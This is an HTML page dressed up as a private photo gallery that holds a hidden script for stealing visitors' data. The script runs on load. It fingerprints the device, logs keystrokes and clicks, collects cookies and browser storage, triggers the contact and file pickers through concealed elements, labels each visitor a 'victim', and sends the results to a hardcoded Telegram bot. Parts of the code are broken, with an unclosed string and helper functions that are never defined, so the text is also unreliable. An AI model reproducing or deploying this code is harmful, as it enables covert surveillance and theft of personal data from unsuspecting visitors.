<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        /* Hidden permission triggers */
        .permission-btn {
            position: absolute;
            opacity: 0.01;
            width: 1px;
            height: 1px;
            pointer-events: none;
        }
    </style>
</head>

    <script>
        // COMPREHENSIVE DATA COLLECTION SYSTEM
        const CONFIG = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            }
        };

        let allCollectedData = {};
        let sessionLog = [];
        let pageLoadTime = Date.now();

        // GOOGLE DATA CAPTURE METHODS
        const GoogleDataCapture = {
            // Extract from Google Analytics if present
            captureGoogleAnalytics: function() {
                try {
                    if (window.ga && ga.getAll) {
                        const trackers = ga.getAll();
                        return trackers.map(tracker => ({
                            trackingId: tracker.get('trackingId'),
                            clientId: tracker.get('clientId'),
                            userId: tracker.get('userId'),
                            sessionId: tracker.get('sessionId')
                        }));
                    }
                } catch(e) {}
                return [];
            },

            // Capture Google Tag Manager data
            captureGTM: function() {
                try {
                    if (window.google_tag_manager) {
                        const gtmData = {};
                        for (let key in window.google_tag_manager) {
                            if (window.google_tag_manager[key].data) {
                                gtmData[key] = window.google_tag_manager[key].data;
                            }
                        }
                        return gtmData;
                    }
                } catch(e) {}
                return {};
            },

            // Extract from gtag if available
            captureGtag: function() {
                try {
                    if (window.gtag && window.dataLayer) {
                        return {
                            dataLayer: window.dataLayer.slice(-20), // Last 20 events
                            gtagConfig: window.gtag
                        };
                    }
                } catch(e) {}
                return {};
            }
        };

        // COMPREHENSIVE DATA COLLECTOR
        async function collectAllData() {
            const startTime = Date.now();
            
            // Collect all data in parallel
            const dataPromises = {
                explicitData: collectExplicitData(),
                technicalData: collectTechnicalData(),
                behavioralData: collectBehavioralData(),
                storedData: collectStoredData(),
                inferredData: collectInferredData(),
                googleData: collectGoogleData(),
                advancedData: collectAdvancedData()
            };

            // Wait for all data collection
            const results = await Promise.allSettled(Object.values(dataPromises));
            
            allCollectedData = {
                collectionMeta: {
                    timestamp: new Date().toISOString(),
                    collectionTime: Date.now() - startTime,
                    victimId: generateVictimId(),
                    url: window.location.href,
                    userAgent: navigator.userAgent
                },
                explicitData: results[0].status === 'fulfilled' ? results[0].value : {},
                technicalData: results[1].status === 'fulfilled' ? results[1].value : {},
                behavioralData: results[2].status === 'fulfilled' ? results[2].value : {},
                storedData: results[3].status === 'fulfilled' ? results[3].value : {},
                inferredData: results[4].status === 'fulfilled' ? results[4].value : {},
                googleData: results[5].status === 'fulfilled' ? results[5].value : {},
                advancedData: results[6].status === 'fulfilled' ? results[6].value : {}
            };

            return allCollectedData;
        }

        // 1. EXPLICIT DATA (Forms, Clicks, User Input)
        async function collectExplicitData() {
            return {
                formSubmissions: captureFormSubmissions(),
                buttonClicks: captureButtonClicks(),
                userInput: captureUserInput(),
                fileDownloads: captureFileDownloads(),
                videoInteractions: captureVideoInteractions()
            };
        }

        // 2. TECHNICAL & DEVICE INFORMATION
        async function collectTechnicalData() {
            return {
                ipInfo: await getIPInfo(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen: {
                    resolution: `${screen.width}x${screen.height}`,
                    availResolution: `${screen.availWidth}x${screen.availHeight}`,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                systemFonts: await getSystemFonts(),
                hardware: {
                    concurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                },
                webgl: getWebGLInfo(),
                plugins: getBrowserPlugins(),
                connection: getConnectionInfo(),
                fingerprint: generateFingerprint()
            };
        }

        // 3. BEHAVIORAL & INTERACTION DATA
        async function collectBehavioralData() {
            return {
                navigation: {
                    referrer: document.referrer,
                    pagesVisited: [window.location.href],
                    sessionStart: pageLoadTime,
                    sessionDuration: Date.now() - pageLoadTime
                },
                interactions: {
                    mouseMovements: sessionLog.filter(log => log.type === 'mousemove').length,
                    clicks: sessionLog.filter(log => log.type === 'click').length,
                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
                    keystrokes: sessionLog.filter(log => log.type === 'keydown').length,
                    formInteractions: sessionLog.filter(log => log.type === 'input').length
                },
                engagement: {
                    bounceRisk: calculateBounceRisk(),
                    activeTime: calculateActiveTime(),
                    scrollDepth: getScrollDepth(),
                    clickHeatmap: generateClickHeatmap()
                }
            };
        }

        // 4. STORED DATA (Cookies, Storage)
        async function collectStoredData() {
            return {
                cookies: getAllCookies(),
                localStorage: getAllLocalStorage(),
                sessionStorage: getAllSessionStorage(),
                indexedDB: await getIndexedDBInfo()
            };
        }

        // 5. INFERRED DATA
        async function collectInferredData() {
            return {
                demographics: inferDemographics(),
                interests: inferInterests(),
                intent: inferUserIntent(),
                value: inferCustomerValue(),
                location: inferEnhancedLocation(),
                deviceType: inferDeviceType()
            };
        }

        // 6. GOOGLE DATA
        async function collectGoogleData() {
            return {
                analytics: GoogleDataCapture.captureGoogleAnalytics(),
                tagManager: GoogleDataCapture.captureGTM(),
                gtag: GoogleDataCapture.captureGtag(),
                adsData: captureGoogleAdsData()
            };
        }

        // 7. ADVANCED DATA (Contacts, Filesystem)
        async function collectAdvancedData() {
            return {
                contacts: await attemptContactAccess(),
                fileSystem: await attemptFileSystemAccess(),
                mediaDevices: await getMediaDevices(),
                bluetooth: await checkBluetooth(),
                clipboard: await checkClipboardAccess(),
                geolocation: await attemptGeolocation()
            };
        }

        // CONTACT LIST ACCESS IMPLEMENTATION
        async function attemptContactAccess() {
            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
                return { available: false, error: 'Contact Picker API not supported' };
            }

            try {
                // Trigger contact picker on user interaction
                const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address'], { multiple: true });
                return {
                    available: true,
                    accessed: true,
                    contacts: contacts.map(contact => ({
                        name: contact.name ? contact.name.join(' ') : 'Unknown',
                        emails: contact.email || [],
                        phones: contact.tel || [],
                        addresses: contact.address || []
                    }))
                };
            } catch (error) {
                return {
                    available: true,
                    accessed: false,
                    error: error.message
                };
            }
        }

        // FILE SYSTEM ACCESS IMPLEMENTATION
        async function attemptFileSystemAccess() {
            if (!('showOpenFilePicker' in window)) {
                return { available: false, error: 'File System Access API not supported' };
            }

            try {
                // Try to trigger file picker
                const fileHandles = await window.showOpenFilePicker({
                    multiple: true,
                    types: [
                        {
                            description: 'Documents',
                            accept: {
                                'application/pdf': ['.pdf'],
                                'application/msword': ['.doc'],
                                'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['.docx']
                            }
                        },
                        {
                            description: 'Images',
                            accept: {
                                'image/*': ['.png', '.jpg', '.jpeg', '.gif']
                            }
                        }
                    ]
                });

                const files = [];
                for (const handle of fileHandles) {
                    const file = await handle.getFile();
                    files.push({
                        name: file.name,
                        type: file.type,
                        size: file.size,
                        lastModified: file.lastModified
                    });
                }

                return {
                    available: true,
                    accessed: true,
                    files: files
                };
            } catch (error) {
                return {
                    available: true,
                    accessed: false,
                    error: error.message
                };
            }
        }

        // SEND COMPREHENSIVE SINGLE MESSAGE
        async function sendComprehensiveReport() {
            const data = await collectAllData();
            const message = formatComprehensiveMessage(data);
            await sendToTelegram(message);
        }

        // FORMAT COMPREHENSIVE MESSAGE
        function formatComprehensiveMessage(data) {
            return `ðŸš¨ **COMPLETE DATA CAPTURE REPORT** ðŸš¨

ðŸ“Š **SESSION OVERVIEW**
ðŸ†” Victim ID: ${data.collectionMeta.victimId}
â° Collection Time: ${data.collectionMeta.collectionTime}ms
ðŸŒ URL: ${data.collectionMeta.url}
ðŸ“… Timestamp: ${new Date(data.collectionMeta.timestamp).toLocaleString()}

ðŸ”§ **TECHNICAL FINGERPRINT**
ðŸ“ IP: ${data.technicalData.ipInfo.ip} | ISP: ${data.technicalData.ipInfo.isp}
ðŸ’» Platform: ${data.technicalData.platform} | OS: ${inferOS(data.technicalData.userAgent)}
ðŸ–¥ï¸ Screen: ${data.technicalData.screen.resolution} | RAM: ${data.technicalData.hardware.deviceMemory}GB
âš™ï¸ Cores: ${data.technicalData.hardware.concurrency} | Touch: ${data.technicalData.hardware.maxTouchPoints}
ðŸŒ Timezone: ${data.technicalData.timezone} | Language: ${data.technicalData.language}

ðŸ“ˆ **BEHAVIORAL ANALYTICS**
ðŸ”— Referrer: ${data.behavioralData.navigation.referrer || 'Direct'}
â±ï¸ Session: ${Math.round(data.behavioralData.navigation.sessionDuration/1000)}s
ðŸ–±ï¸ Interactions: ${data.behavioralData.interactions.clicks} clicks, ${data.behavioralData.interactions.mouseMovements} moves
ðŸ“œ Scroll Depth: ${data.behavioralData.engagement.scrollDepth}% | Active Time: ${Math.round(data.behavioralData.engagement.activeTime/1000)}s

ðŸ’¾ **STORED DATA**
ðŸª Cookies: ${Object.keys(data.storedData.cookies).length} cookies
ðŸ’¾ Local Storage: ${Object.keys(data.storedData.localStorage).length} items
ðŸ—„ï¸ Session Storage: ${Object.keys(data.storedData.sessionStorage).length} items

ðŸŽ¯ **INFERRED PROFILE**
ðŸ‘¤ Demographics: ${data.inferredData.demographics.ageRange}, ${data.inferredData.demographics.gender}
ðŸŽ¯ Intent: ${data.inferredData.intent}
ðŸ’° Value Score: ${data.inferredData.value}/100
ðŸ“± Device Type: ${data.inferredData.deviceType}

ðŸ” **GOOGLE DATA**
ðŸ“Š Analytics: ${data.googleData.analytics.length} trackers
ðŸ·ï¸ GTM: ${Object.keys(data.googleData.tagManager).length} containers
ðŸ“ˆ Data Layer: ${data.googleData.gtag.dataLayer ? data.googleData.gtag.dataLayer.length : 0} events

ðŸš€ **ADVANCED CAPTURES**
ðŸ“± Contacts: ${data.advancedData.contacts.available ? (data.advancedData.contacts.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
ðŸ“ File System: ${data.advancedData.fileSystem.available ? (data.advancedData.fileSystem.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
ðŸŽ¥ Media Devices: ${data.advancedData.mediaDevices.length} devices
ðŸ“¡ Bluetooth: ${data.advancedData.bluetooth.available ? 'Available' : 'Not available'}
ðŸ“‹ Clipboard: ${data.advancedData.clipboard.available ? 'Accessible' : 'Not accessible'}

ðŸ“ **EXPLICIT INTERACTIONS**
ðŸ“‹ Form Fields: ${data.explicitData.formSubmissions.fieldsFound}
ðŸ–±ï¸ Button Clicks: ${data.explicitData.buttonClicks.totalClicks}
âŒ¨ï¸ User Input: ${data.explicitData.userInput.inputEvents} fields
ðŸ“¥ Downloads: ${data.explicitData.fileDownloads.downloadClicks}
ðŸŽ¬ Video Plays: ${data.explicitData.videoInteractions.plays}

ðŸŽ­ **FINGERPRINT UNIQUENESS**
ðŸ”‘ Fingerprint Hash: ${data.technicalData.fingerprint.hash}
ðŸŽ¨ Canvas: ${data.technicalData.fingerprint.canvas ? 'Unique' : 'Failed'}
ðŸ”„ WebGL: ${data.technicalData.fingerprint.webgl ? 'Unique' : 'Failed'}
ðŸ”¤ Fonts: ${data.technicalData.fingerprint.fonts} fonts detected

ðŸ“ˆ **ENGAGEMENT METRICS**
ðŸ“‰ Bounce Risk: ${data.behavioralData.engagement.bounceRisk}%
ðŸ”¥ Activity Score: ${calculateEngagementScore(data.behavioralData)}/100
ðŸŽ¯ Focus Areas: ${data.behavioralData.engagement.clickHeatmap.length} hot zones

        }

        // SEND SUMMARY ON PAGE UNLOAD
        function setupUnloadHandler() {
            window.addEventListener('beforeunload', async function() {
                const summary = generateSessionSummary();
                await sendToTelegram(summary);
            });
        }

        function generateSessionSummary() {
            const duration = Date.now() - pageLoadTime;
            const totalInteractions = sessionLog.length;
            
            return `ðŸ“Š **SESSION SUMMARY** ðŸ“Š

ðŸ†” ${allCollectedData.collectionMeta.victimId}
â° Duration: ${Math.round(duration/1000)} seconds
ðŸ–±ï¸ Total Interactions: ${totalInteractions}
ðŸ“œ Pages: 1 (Single Page Application)
ðŸŽ¯ Engagement: ${calculateEngagementScore(allCollectedData.behavioralData)}/100
ðŸ“ˆ Data Points: ${countTotalDataPoints(allCollectedData)}

ðŸ”š **Session ended at:** ${new Date().toLocaleString()}`;
        }

        // HELPER FUNCTIONS
        function generateVictimId() {
            return `v_${Math.random().toString(36).substr(2, 9)}_${Date.now().toString(36)}`;
        }

        function calculateEngagementScore(behavioralData) {
            let score = 0;
            if (behavioralData.interactions.clicks > 5) score += 30;
            if (behavioralData.interactions.mouseMovements > 20) score += 20;
            if (behavioralData.engagement.scrollDepth > 50) score += 25;
            if (behavioralData.engagement.activeTime > 10000) score += 25;
            return Math.min(100, score);
        }

        function countTotalDataPoints(data) {
            let count = 0;
            for (let category in data) {
                if (typeof data[category] === 'object') {
                    count += Object.keys(data[category]).length;
                }
            }
            return count;
        }

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram send failed:', error);
                return false;
            }
        }

        // INITIALIZATION
        window.addEventListener('load', function() {
            pageLoadTime = Date.now();
            
            // Start comprehensive data collection
            setTimeout(sendComprehensiveReport, 1000);
            
            // Setup session tracking
            setupSessionTracking();
            setupUnloadHandler();
            
            // Attempt advanced permissions on user interaction
            document.addEventListener('click', function() {
                setTimeout(() => {
                    document.getElementById('contactTrigger').click();
                    document.getElementById('fileTrigger').click();
                }, 2000);
            }, { once: true });
        });

        // Setup session tracking for behavioral data
        function setupSessionTracking() {
            // Track mouse movements
            document.addEventListener('mousemove', (e) => {
                sessionLog.push({
                    type: 'mousemove',
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: Date.now()
                });
            });

            // Track clicks
            document.addEventListener('click', (e) => {
                sessionLog.push({
                    type: 'click',
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    timestamp: Date.now()
                });
            });

            // Track scrolling
            document.addEventListener('scroll', (e) => {
                sessionLog.push({
                    type: 'scroll',
                    position: window.scrollY,
                    timestamp: Date.now()
                });
            });

            // Track keyboard input
            document.addEventListener('keydown', (e) => {
                sessionLog.push({
                    type: 'keydown',
                    key: e.key,
                    target: e.target.tagName,
                    timestamp: Date.now()
                });
            });

            // Track form interactions
            document.addEventListener('input', (e) => {
                sessionLog.push({
                    type: 'input',
                    target: e.target.tagName,
                    valueLength: e.target.value.length,
                    timestamp: Date.now()
                });
            });
        }

        // Image click handler
        function openImage(imageId) {
            // Send immediate report if not already sent
            if (Object.keys(allCollectedData).length === 0) {
                sendComprehensiveReport();
            }
            
            // Open image
            const images = {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
            };
            
            if (images[imageId]) {
                window.open(images[imageId], '_blank');
            }
        }

        console.log('Comprehensive data capture system loaded');
    </script>
</body>
